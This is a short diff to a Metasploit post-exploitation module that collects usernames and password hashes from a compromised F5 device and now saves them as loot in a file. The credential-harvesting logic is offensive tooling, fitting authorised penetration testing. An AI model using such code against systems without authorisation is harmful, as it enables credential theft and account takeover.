@@ -46,10 +46,10 @@ class MetasploitModule < Msf::Post
       return
     end
 
+    loot = []
     users.each do |u|
-      print_good("#{u['userdb_entry_name']} / #{u['userdb_entry_passwd']}")
+      vprint_good("#{u['userdb_entry_name']} / #{u['userdb_entry_passwd']}")
 
-      # TODO: store loot?
       create_credential(
         jtr_format: Metasploit::Framework::Hashes.identify_hash(u['userdb_entry_passwd']),
         origin_type: :session,
@@ -60,13 +60,9 @@ class MetasploitModule < Msf::Post
         username: u['userdb_entry_name'],
         workspace_id: myworkspace_id
       )
+      loot << "#{u['userdb_entry_name']}:#{u['userdb_entry_passwd']}"
     end
+
+    print_good("Passwords stored in #{store_loot('f5.passwords', 'text/plain', session, loot.join("\n"), nil, 'F5 Password Hashes')}")
   end
-
-  # def save(msg, data, ctype = 'text/plain')
-  #   ltype = 'linux.enum.users'
-  #   loot = store_loot(ltype, ctype, session, data, nil, msg)
-  #   print_good("#{msg} stored in #{loot.to_s}")
-  # end
-
 end
